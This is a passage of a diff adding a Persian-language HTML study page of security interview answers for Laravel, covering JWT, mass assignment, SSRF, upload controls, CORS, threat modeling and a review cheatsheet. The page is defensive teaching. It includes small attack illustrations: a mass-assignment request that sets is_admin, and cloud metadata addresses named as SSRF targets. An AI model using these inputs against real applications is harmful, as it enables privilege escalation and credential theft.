+          <li>نبود مکانیزم <strong>ابطال</strong>: logout یا تغییر رمز توکن را باطل نمی‌کند.</li>
+        </ul>
+        <p><strong>راه‌حل‌ها:</strong> access token کوتاه‌عمر (چند دقیقه) + refresh token چرخشی ذخیره‌شده سمت سرور با تشخیص استفاده مجدد؛ denylist بر اساس <code>jti</code> در Redis در صورت نیاز؛ کتابخانه معتبر با allowlist الگوریتم؛ کوکی HttpOnly برای SPA هم‌دامنه.</p>
+        <p><strong>مقایسه:</strong> اگر ابطال فوری مهم است و یک سرویس دارید، session یا توکن opaque (مثل Sanctum که هش توکن را در DB نگه می‌دارد) ساده‌تر و امن‌تر است.</p>
+      </div>
+    </details>
+
+    <details class="qa" id="q-owasp-security-10">
+      <summary>Mass Assignment چیست؟ کد <code>User::create($request-&gt;all())</code> چه خطری دارد و تفاوت <code>$fillable</code> و <code>$guarded</code> چیست؟</summary>
+      <div class="answer">
+        <p><strong>تعریف:</strong> آسیب‌پذیری‌ای که در آن همه فیلدهای ارسالی کاربر به‌صورت دسته‌جمعی به ویژگی‌های مدل نسبت داده می‌شوند؛ مهاجم فیلدهایی را که در فرم نبوده (مثل <code>is_admin</code>، <code>role</code>، <code>balance</code>، <code>email_verified_at</code>) به درخواست اضافه می‌کند و آنها را تغییر می‌دهد. نتیجه: <strong>privilege escalation</strong> یا دستکاری داده.</p>
+        <p><strong>خطر کد:</strong> <code>$request-&gt;all()</code> هر چیزی را که کاربر فرستاده شامل می‌شود. اگر مدل <code>$guarded = []</code> داشته باشد، درخواست <code>name=Ali&amp;is_admin=1</code> یک ادمین می‌سازد.</p>
+        <ul>
+          <li><strong><code>$fillable</code></strong>: <strong>allowlist</strong>؛ فقط فیلدهای نام‌برده mass-assignable هستند. فیلد جدید به‌طور پیش‌فرض محافظت‌شده است؛ امن‌تر.</li>
+          <li><strong><code>$guarded</code></strong>: <strong>denylist</strong>؛ همه به جز فیلدهای نام‌برده. اگر ستون حساس جدیدی اضافه شود و فراموش شود، باز است. <code>$guarded = []</code> یعنی محافظت خاموش.</li>
+        </ul>
+        <pre><code class="language-php">&lt;?php
+// اصلاح
+$user = User::create($request-&gt;validated());   // فقط فیلدهای قوانین FormRequest
+
+// فیلد حساس: صریح، پس از authorization
+Gate::authorize('changeRole', $user);
+$user-&gt;forceFill(['role' =&gt; Role::Editor])-&gt;save();</code></pre>
+        <p><strong>بهترین روش:</strong> هر دو لایه: <code>$fillable</code> در مدل + استفاده از <code>validated()</code>/<code>safe()-&gt;only()</code>. در توسعه <code>Model::preventSilentlyDiscardingAttributes()</code> را فعال کنید. سمت خروجی هم با API Resource فقط فیلدهای مجاز را برگردانید.</p>
+      </div>
+    </details>
+
+    <details class="qa" id="q-owasp-security-11">
+      <summary>SSRF را تعریف کنید. در یک قابلیت «وارد کردن تصویر از URL» چه ریسک‌هایی وجود دارد و چگونه آن را امن پیاده‌سازی می‌کنید؟</summary>
+      <div class="answer">
+        <p><strong>تعریف:</strong> Server-Side Request Forgery یعنی مهاجم سرور را وادار کند به URL دلخواه او درخواست بفرستد. سرور در شبکه داخلی و با اعتماد بیشتری نسبت به مهاجم قرار دارد، پس به‌عنوان پراکسی برای رسیدن به منابع داخلی استفاده می‌شود.</p>
+        <p><strong>ریسک‌ها:</strong></p>
+        <ul>
+          <li>دسترسی به <strong>metadata ابری</strong> (<code>169.254.169.254</code>) و سرقت credential.</li>
+          <li>دسترسی به سرویس‌های داخلی بدون احراز هویت (Redis، Elasticsearch، پنل ادمین روی localhost).</li>
+          <li>اسکن پورت و شبکه داخلی؛ استفاده از schemeهای <code>file://</code> و <code>gopher://</code>.</li>
+          <li>DoS با URL به فایل‌های بسیار بزرگ یا پاسخ کند.</li>
+        </ul>
+        <p><strong>پیاده‌سازی امن:</strong></p>
+        <ul>
+          <li><strong>Allowlist</strong> دامنه‌ها در صورت امکان؛ فقط <code>https</code>.</li>
+          <li>در غیر این صورت: resolve کردن DNS و رد IPهای خصوصی، loopback، link-local و رزروشده (هم IPv4 هم IPv6)، و اتصال به همان IP بررسی‌شده (مقابله با <strong>DNS rebinding</strong>).</li>
+          <li><strong>غیرفعال‌کردن redirect</strong> یا بررسی مجدد مقصد هر redirect.</li>
+          <li>timeout کوتاه، محدودیت اندازه پاسخ، بررسی <code>Content-Type</code> و اعتبارسنجی اینکه محتوا واقعاً تصویر است (re-encode).</li>
+          <li>اجرای دانلود در <strong>Job</strong> روی worker با شبکه ایزوله و <strong>egress filtering</strong>؛ در AWS استفاده از IMDSv2.</li>
+          <li>برنگرداندن پاسخ یا پیام خطای خام به کاربر.</li>
+        </ul>
+        <p><strong>نکته:</strong> denylist رشته‌ای (مثلاً رد «localhost») با نمایش‌های مختلف IP، دامنه‌هایی که به 127.0.0.1 resolve می‌شوند یا redirect به‌راحتی دور زده می‌شود.</p>
+      </div>
+    </details>
+
+    <details class="qa" id="q-owasp-security-12">
+      <summary>برای یک قابلیت آپلود فایل (مدارک هویتی کاربران) چه کنترل‌های امنیتی پیاده می‌کنید؟</summary>
+      <div class="answer">
+        <p><strong>تهدیدها:</strong> آپلود web shell و اجرای کد، XSS با HTML/SVG، path traversal با نام فایل، DoS با فایل بزرگ، فایل polyglot، و نشت مدارک حساس به افراد غیرمجاز.</p>
+        <p><strong>کنترل‌ها:</strong></p>
+        <ol>
+          <li><strong>Validation محتوا‌محور با allowlist</strong>: <code>File::types(['jpg','png','pdf'])-&gt;max(5 * 1024)</code>؛ MIME از محتوا تشخیص داده می‌شود نه از هدر کلاینت.</li>
+          <li><strong>محدودیت اندازه</strong> در validation، <code>upload_max_filesize</code>/<code>post_max_size</code> و <code>client_max_body_size</code>.</li>
+          <li><strong>نام تصادفی سمت سرور</strong> (<code>store()</code> با hashName)؛ نام اصلی فقط به‌عنوان metadata در DB.</li>
+          <li><strong>ذخیره خارج از document root</strong> روی disk خصوصی یا object storage خصوصی؛ عدم امکان اجرای PHP در مسیر آپلود.</li>
+          <li><strong>تحویل با بررسی مجوز</strong>: controller با <code>Gate::authorize</code> و <code>Storage::download</code>، یا temporary signed URL کوتاه‌عمر.</li>
+          <li><strong>پردازش مجدد تصویر</strong> (re-encode) برای حذف payload و metadata (مثل GPS در EXIF).</li>
+          <li><strong>رمزنگاری at rest</strong> برای مدارک هویتی (encryption سمت سرور storage).</li>
+          <li>اسکن بدافزار به‌صورت async (Job + ClamAV) و قرنطینه تا پایان اسکن.</li>
+          <li>هدرهای <code>Content-Disposition: attachment</code> و <code>X-Content-Type-Options: nosniff</code> هنگام سرو.</li>
+          <li>rate limit روی endpoint آپلود و لاگ دسترسی به مدارک (audit).</li>
+        </ol>
+        <pre><code class="language-php">&lt;?php
+$path = $request-&gt;file('id_card')-&gt;store("kyc/{$user-&gt;id}", 's3-private');
+return Storage::disk('s3-private')-&gt;temporaryUrl($path, now()-&gt;addMinutes(5));</code></pre>
+      </div>
+    </details>
+
+    <details class="qa" id="q-owasp-security-13">
+      <summary>Encryption، Hashing و Encoding را تعریف و مقایسه کنید. برای هر کدام یک کاربرد درست و یک کاربرد نادرست مثال بزنید.</summary>
+      <div class="answer">
+        <ul>
+          <li><strong>Encoding:</strong> تبدیل قالب داده برای انتقال یا سازگاری (Base64، URL encoding، HTML entities)؛ <strong>برگشت‌پذیر بدون کلید</strong> و <strong>هیچ امنیتی</strong> نمی‌دهد. درست: Base64 کردن فایل باینری برای JSON. نادرست: Base64 کردن رمز یا شماره کارت و «امن» دانستن آن (payload در JWT هم فقط encode شده است).</li>
+          <li><strong>Hashing:</strong> تابع <strong>یک‌طرفه</strong> که خروجی با طول ثابت تولید می‌کند و تغییر کوچک ورودی آن را کاملاً عوض می‌کند. درست: SHA-256 برای checksum فایل، bcrypt/Argon2id برای رمز، HMAC-SHA256 برای امضای webhook. نادرست: MD5/SHA-1 برای رمز، یا هش بدون salt.</li>
+          <li><strong>Encryption:</strong> تبدیل داده به ciphertext با <strong>کلید</strong> که فقط با کلید برگشت‌پذیر است؛ هدف: <strong>محرمانگی</strong>. متقارن (AES-256-GCM) یا نامتقارن (RSA/ECC). درست: رمزنگاری کد ملی با cast <code>encrypted</code> یا <code>Crypt::encryptString</code>؛ TLS برای انتقال. نادرست: رمزنگاری رمز عبور (اگر کلید لو برود همه رمزها لو می‌روند)، حالت ECB، کلید hardcode‌شده.</li>
+        </ul>
+        <div class="table-wrap"><table>
+          <thead><tr><th></th><th>برگشت‌پذیر</th><th>کلید</th><th>هدف</th></tr></thead>
+          <tbody>
+            <tr><td>Encoding</td><td>بله</td><td>ندارد</td><td>سازگاری</td></tr>
+            <tr><td>Hashing</td><td>خیر</td><td>ندارد (HMAC دارد)</td><td>Integrity، ذخیره رمز</td></tr>
+            <tr><td>Encryption</td><td>با کلید</td><td>دارد</td><td>Confidentiality</td></tr>
+          </tbody>
+        </table></div>
+        <p><strong>نکته Laravel:</strong> <code>Crypt</code> از <code>APP_KEY</code> و AES با MAC استفاده می‌کند تا دستکاری ciphertext تشخیص داده شود؛ ستون‌های encrypted قابل جست‌وجو با WHERE نیستند و چرخش کلید نیاز به برنامه دارد.</p>
+      </div>
+    </details>
+
+    <details class="qa" id="q-owasp-security-14">
+      <summary>هنگام بررسی یک سرور production متوجه می‌شوید <code>APP_DEBUG=true</code> است و فایل <code>https://site.com/.env</code> قابل دانلود است. چه ریسک‌هایی وجود دارد و چه اقداماتی انجام می‌دهید؟</summary>
+      <div class="answer">
+        <p><strong>دسته:</strong> Security Misconfiguration (A05) با پیامد Information Disclosure.</p>
+        <p><strong>ریسک‌ها:</strong></p>
+        <ul>
+          <li><code>.env</code> شامل <code>APP_KEY</code>، رمز دیتابیس، کلیدهای API، SMTP و درگاه پرداخت است؛ با <code>APP_KEY</code> مهاجم می‌تواند کوکی و داده رمزنگاری‌شده و signed URL جعل کند و داده‌های <code>encrypted</code> را رمزگشایی کند.</li>
+          <li>صفحه دیباگ stack trace، کوئری SQL، مسیر فایل‌ها، نسخه‌ها و گاهی متغیرهای محیطی را نشان می‌دهد که شناسایی و حملات بعدی را تسهیل می‌کند.</li>
+        </ul>
+        <p><strong>اقدامات فوری (به ترتیب):</strong></p>
+        <ol>
+          <li><code>APP_DEBUG=false</code> و <code>APP_ENV=production</code>، سپس <code>php artisan config:cache</code>.</li>
+          <li>اصلاح document root وب‌سرور به <code>public/</code> و بستن مسیرهای نقطه‌دار.</li>
+          <li><strong>فرض نشت</strong>: چرخش همه secretها: رمز DB، کلیدهای API، <code>APP_KEY</code> (با برنامه برای داده رمزنگاری‌شده؛ <code>APP_PREVIOUS_KEYS</code>)، باطل کردن sessionها.</li>
+          <li>بررسی access log برای درخواست‌های <code>/.env</code> و فعالیت مشکوک با credentialهای لو رفته؛ در صورت لزوم فرایند incident response.</li>
+        </ol>
+        <p><strong>پیشگیری:</strong> چک‌لیست deploy خودکار، اسکن پیکربندی در CI، تست خارجی مسیرهای حساس، مدیریت secret با secret manager و monitoring.</p>
+      </div>
+    </details>
+
+    <details class="qa" id="q-owasp-security-15">
+      <summary>CORS چیست و چه ارتباطی با Same-Origin Policy دارد؟ یک پیکربندی اشتباه CORS و پیامد آن را توضیح دهید.</summary>
+      <div class="answer">
+        <p><strong>SOP:</strong> سیاست مرورگر که اجازه نمی‌دهد اسکریپت یک origin (scheme + host + port) <strong>پاسخ</strong> درخواست به origin دیگر را بخواند. SOP از داده‌های کاربر در سایت‌های دیگر محافظت می‌کند.</p>
+        <p><strong>CORS:</strong> مکانیزمی با هدرهای HTTP که سرور با آن <strong>به‌طور کنترل‌شده</strong> SOP را برای originهای مشخص شل می‌کند (<code>Access-Control-Allow-Origin</code>، <code>-Methods</code>، <code>-Headers</code>، <code>-Credentials</code>). برای درخواست‌های غیرساده، مرورگر ابتدا <strong>preflight</strong> با <code>OPTIONS</code> می‌فرستد.</p>
+        <p><strong>پیکربندی اشتباه رایج:</strong> سرور مقدار هدر <code>Origin</code> درخواست را بدون بررسی در <code>Access-Control-Allow-Origin</code> بازتاب می‌دهد و <code>Access-Control-Allow-Credentials: true</code> هم دارد. <strong>پیامد:</strong> هر سایت مخربی که کاربر لاگین‌کرده باز کند، می‌تواند با کوکی کاربر به API درخواست بزند و <strong>پاسخ را بخواند</strong> (پروفایل، توکن‌ها، داده‌های مالی). موارد مشابه: اعتماد به <code>Origin: null</code> و regex ضعیف دامنه.</p>
+        <pre><code class="language-php">&lt;?php
+// config/cors.php
+'allowed_origins' =&gt; ['https://app.example.com'],
+'supports_credentials' =&gt; true,</code></pre>
+        <p><strong>نکات کلیدی:</strong></p>
+        <ul>
+          <li>CORS کنترل دسترسی سمت سرور <strong>نیست</strong>؛ ابزارهای غیرمرورگری آن را نادیده می‌گیرند.</li>
+          <li>CORS از <strong>CSRF</strong> محافظت نمی‌کند؛ SOP جلوی ارسال درخواست ساده را نمی‌گیرد، فقط خواندن پاسخ را.</li>
+          <li><code>*</code> برای API عمومی بدون credential قابل قبول است.</li>
+        </ul>
+      </div>
+    </details>
+
+    <details class="qa" id="q-owasp-security-16">
+      <summary>اصول «Least Privilege» و «Defense in Depth» را تعریف کنید و برای هر کدام مثال‌هایی در یک اپلیکیشن Laravel بزنید.</summary>
+      <div class="answer">
+        <p><strong>Least Privilege:</strong> هر موجودیت (کاربر، سرویس، پروسه، توکن) فقط <strong>حداقل دسترسی لازم</strong> برای انجام کارش را، فقط برای <strong>مدت لازم</strong>، داشته باشد. هدف: محدود کردن <strong>دامنه آسیب (blast radius)</strong> در صورت نفوذ.</p>
+        <ul>
+          <li>کاربر دیتابیس اپ بدون <code>DROP</code>/<code>GRANT</code>؛ کاربر جدا برای migration.</li>
+          <li>PHP-FPM با کاربر غیر root؛ فقط <code>storage</code> و <code>bootstrap/cache</code> قابل نوشتن.</li>
+          <li>توکن‌های Sanctum با ability محدود (<code>['orders:read']</code>) و <code>tokenCan()</code>.</li>
+          <li>نقش‌ها و Policyهای ریزدانه به‌جای «ادمین یا هیچ»؛ IAM policy محدود به یک bucket.</li>
+        </ul>
+        <p><strong>Defense in Depth:</strong> استفاده از <strong>چند لایه کنترل مستقل</strong>، تا شکست یا دور زده شدن یک لایه به نفوذ کامل منجر نشود.</p>
+        <ul>
+          <li>XSS: output encoding در Blade + CSP + کوکی HttpOnly + validation.</li>
+          <li>SQLi: Eloquent bindings + allowlist ستون‌ها + کاربر DB محدود + خطای عمومی.</li>
+          <li>دسترسی: middleware <code>auth</code> + Policy + scope کوئری به کاربر/tenant + تست خودکار.</li>
+          <li>شبکه: WAF و rate limit + TLS + فایروال که DB و Redis را از اینترنت جدا می‌کند.</li>
+          <li>تشخیص: لاگ امنیتی + alert.</li>
+        </ul>
+        <p><strong>رابطه:</strong> این دو مکمل‌اند؛ least privilege اثر نفوذ را کم می‌کند و defense in depth احتمال موفقیت نفوذ را. هر دو بخشی از طراحی امن (پیشگیری از Insecure Design) هستند و همراه با <strong>fail securely</strong> و <strong>secure by default</strong> مطرح می‌شوند.</p>
+      </div>
+    </details>
+
+    <details class="qa" id="q-owasp-security-17">
+      <summary>Threat Modeling چیست؟ مدل STRIDE را توضیح دهید و آن را روی یک endpoint «انتقال وجه» اعمال کنید.</summary>
+      <div class="answer">
+        <p><strong>Threat Modeling:</strong> فرایند ساختاریافته و ترجیحاً در فاز <strong>طراحی</strong> برای شناسایی تهدیدها و تعیین کنترل‌ها، با چهار سوال: چه می‌سازیم (DFD و <strong>trust boundary</strong>‌ها)؟ چه چیزی ممکن است خراب شود؟ چه می‌کنیم؟ آیا کافی بود؟ ابزار اصلی مقابله با <strong>Insecure Design</strong> است و Shift Left را محقق می‌کند.</p>
+        <p><strong>STRIDE روی <code>POST /transfers</code>:</strong></p>
+        <ul>
+          <li><strong>Spoofing</strong> (Authentication): استفاده از session دزدیده‌شده ← MFA یا تأیید OTP برای انتقال، کوکی امن.</li>
+          <li><strong>Tampering</strong> (Integrity): تغییر مبلغ یا مقصد در مسیر یا دستکاری فیلد مخفی ← TLS، محاسبه و بررسی همه چیز سمت سرور، CSRF token.</li>
+          <li><strong>Repudiation</strong> (Non-repudiation): کاربر انتقال را انکار می‌کند ← audit log غیرقابل تغییر با user، IP، زمان و شناسه درخواست.</li>
+          <li><strong>Information Disclosure</strong> (Confidentiality): دیدن تراکنش دیگران با IDOR یا خطای دیباگ ← Policy، خطای عمومی، عدم افشای موجودی در پیام خطا.</li>
+          <li><strong>Denial of Service</strong> (Availability): هزاران درخواست انتقال ← rate limit، timeout، صف.</li>
+          <li><strong>Elevation of Privilege</strong> (Authorization): برداشت از حساب دیگران یا تغییر سقف انتقال با mass assignment ← Policy روی حساب مبدأ، <code>$fillable</code>، least privilege.</li>
+        </ul>
+        <p><strong>تکمیلی برای این endpoint:</strong> <strong>idempotency key</strong> برای جلوگیری از انتقال تکراری، تراکنش دیتابیس با <code>lockForUpdate</code> برای جلوگیری از race condition (برداشت هم‌زمان بیش از موجودی)، و محدودیت‌های کسب‌وکار (سقف روزانه).</p>
+      </div>
+    </details>
+  </section>
+
+  <!-- ============ Cheatsheet ============ -->
+  <section class="lesson" id="cheatsheet" data-title="خلاصه برای مرور سریع">
+    <h2>خلاصه برای مرور سریع</h2>
+    <div class="cheatsheet">
+      <h4>OWASP Top 10 — 2021</h4>
+      <ul>
+        <li>A01 Broken Access Control ← Policy/Gate، deny by default</li>
+        <li>A02 Cryptographic Failures ← bcrypt/Argon2id، TLS، <code>encrypted</code></li>
+        <li>A03 Injection (+XSS) ← binding، output encoding</li>
+        <li>A04 Insecure Design ← threat modeling</li>
+        <li>A05 Security Misconfiguration (+XXE) ← <code>APP_DEBUG=false</code>، root=<code>public/</code></li>
+        <li>A06 Vulnerable Components ← <code>composer audit</code></li>
+        <li>A07 Auth Failures ← throttle، MFA، regenerate session</li>
+        <li>A08 Integrity Failures (+Deserialization) ← JSON، امضا، SRI</li>
+        <li>A09 Logging Failures ← لاگ + alert</li>
+        <li>A10 SSRF ← allowlist، بلاک IP داخلی، بدون redirect</li>
+        <li>2025: SSRF داخل A01؛ جدید: Supply Chain Failures، Mishandling of Exceptional Conditions.</li>
+      </ul>
+
+      <h4>Injection و XSS</h4>
+      <ul>
+        <li>Prepared statement: کد و داده جدا ارسال می‌شوند.</li>
+        <li><code>*Raw</code> و <code>DB::statement</code> فقط با <code>?</code> + آرایه bindings.</li>
+        <li>نام ستون/جهت sort ← allowlist.</li>
+        <li>Command injection ← <code>Process::run([...])</code> یا <code>escapeshellarg</code>.</li>
+        <li>XSS: Stored، Reflected، DOM.</li>
+        <li><code>{{ }}</code> = escape؛ <code>{!! !!}</code> = خام؛ <code>@js()</code> برای JS؛ scheme لینک را validate کن.</li>
+        <li>CSP با nonce، بدون <code>unsafe-inline</code>؛ اول Report-Only.</li>
+      </ul>
+
+      <h4>CSRF / CORS</h4>
+      <ul>
+        <li>CSRF = کوکی خودکار + اثر جانبی؛ Bearer header مصون است.</li>
+        <li><code>@csrf</code>، <code>X-CSRF-TOKEN</code>، <code>XSRF-TOKEN</code>؛ خطای 419.</li>
+        <li>SameSite: Strict / Lax (پیش‌فرض) / None+Secure.</li>
+        <li>GET نباید وضعیت را تغییر دهد.</li>
+        <li>SOP خواندن پاسخ را می‌بندد نه ارسال را؛ CORS ≠ محافظت CSRF.</li>
+        <li>هرگز Origin بازتابی + credentials.</li>
+      </ul>
+
+      <h4>Auth و Session</h4>
+      <ul>
+        <li>رمز: Argon2id/bcrypt، salt خودکار، کند؛ MD5/SHA ممنوع.</li>
+        <li><code>Hash::make</code>، <code>Hash::check</code>، cast <code>hashed</code>، <code>Password::uncompromised()</code>.</li>
+        <li>Rate limit: ایمیل+IP؛ پیام خطای عمومی؛ MFA (TOTP &gt; SMS، Passkey ضد phishing).</li>
+        <li>لاگین: <code>session()-&gt;regenerate()</code>؛ logout: <code>invalidate()</code> + <code>regenerateToken()</code>.</li>
+        <li>کوکی: Secure، HttpOnly، SameSite.</li>
+        <li><code>hash_equals</code> برای مقایسه توکن؛ <code>random_bytes</code> نه <code>rand</code>.</li>
+      </ul>
+
+      <h4>JWT</h4>
+      <ul>
+        <li>امضا ≠ رمزنگاری؛ payload قابل خواندن است.</li>
+        <li>alg ثابت سمت سرور (none و confusion)؛ secret قوی.</li>
+        <li><code>exp</code> کوتاه + refresh token چرخشی؛ <code>iss</code>/<code>aud</code>.</li>
+        <li>ابطال سخت ← denylist <code>jti</code> یا توکن opaque (Sanctum).</li>
+        <li>localStorage در برابر XSS آسیب‌پذیر است.</li>
+      </ul>
+
+      <h4>Mass Assignment / Deserialization</h4>
+      <ul>
+        <li><code>$fillable</code> (allowlist) &gt; <code>$guarded</code>؛ هرگز <code>$request-&gt;all()</code>؛ از <code>validated()</code> استفاده کن.</li>
+        <li><code>unserialize</code> روی ورودی ← POP chain/RCE؛ JSON یا <code>allowed_classes =&gt; false</code>.</li>
+        <li>نشت <code>APP_KEY</code> = بحرانی؛ چرخش با <code>APP_PREVIOUS_KEYS</code>.</li>
+      </ul>
+
+      <h4>SSRF / Upload</h4>
+      <ul>
+        <li>SSRF: metadata <code>169.254.169.254</code>، سرویس‌های داخلی؛ allowlist، resolve + رد IP خصوصی، بدون redirect، egress filter.</li>
+        <li>Upload: MIME محتوا، allowlist، max size، نام تصادفی، خارج از web root، بدون اجرای PHP، دانلود با Policy.</li>
+      </ul>
+
+      <h4>Crypto / TLS</h4>
+      <ul>
+        <li>Encoding (بدون امنیت) / Hashing (یک‌طرفه) / Encryption (کلید، محرمانگی).</li>
+        <li>HMAC = integrity + authenticity؛ signed URL و webhook.</li>
+        <li>TLS 1.2+، HSTS، هرگز <code>verify=false</code>؛ <code>trustProxies</code>.</li>
+      </ul>
+
+      <h4>Config / Secrets / Deps</h4>
+      <ul>
+        <li><code>APP_DEBUG=false</code>، root=<code>public/</code>، بستن <code>.env</code>/<code>.git</code>، Telescope با Gate.</li>
+        <li>secret در git نه؛ <code>env:encrypt</code> یا Vault؛ نشت = چرخش.</li>
+        <li><code>#[\SensitiveParameter]</code> برای پنهان کردن در stack trace.</li>
+        <li><code>composer audit</code> در CI، Dependabot، <code>composer.lock</code> commit شود.</li>
+      </ul>
+
+      <h4>Headers</h4>
+      <ul>
+        <li>HSTS، CSP، <code>X-Frame-Options: DENY</code> / <code>frame-ancestors</code>، <code>nosniff</code>، Referrer-Policy، Permissions-Policy.</li>
+        <li><code>X-XSS-Protection</code> منسوخ است.</li>
+      </ul>
+
+      <h4>اصول و فرایند</h4>
+      <ul>
+        <li>CIA، Least Privilege، Defense in Depth، Fail Securely، Secure by Default، Zero Trust.</li>
+        <li>لاگ: لاگین/۴۰۳/تغییرات حساس؛ بدون رمز و توکن؛ لاگ متمرکز + alert.</li>
+        <li>STRIDE: Spoofing↔Authn، Tampering↔Integrity، Repudiation↔Non-repudiation، Info Disclosure↔Confidentiality، DoS↔Availability، EoP↔Authz.</li>
+        <li>SDLC: ASVS ← threat model ← SAST ← DAST/SCA ← pentest ← monitoring.</li>
+      </ul>
+    </div>
+  </section>
+
+</main>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/dockerfile.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/nginx.min.js"></script>
+<script src="../assets/js/manifest.js"></script>
+<script src="../assets/js/app.js"></script>
+</body>
+</html>
